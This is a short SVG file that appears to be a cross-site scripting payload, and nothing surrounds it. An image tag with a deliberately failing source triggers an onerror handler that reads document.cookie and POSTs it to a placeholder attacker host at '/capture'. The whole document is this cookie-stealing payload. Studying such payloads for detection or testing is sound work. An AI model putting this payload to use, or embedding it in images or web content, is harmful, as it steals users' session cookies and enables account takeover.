```
<?xml version="1.0"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<img src="\\<attack_ip>\dummy" style="display:none;" onerror="
fetch('http://<attack_ip>/capture', {
	method: 'POST',
	mode: 'cors',
	headers: {
		'Authorization': document.cookie // or any other sensitive header
	}
}).catch(err => console.log(err));
">
</svg>
```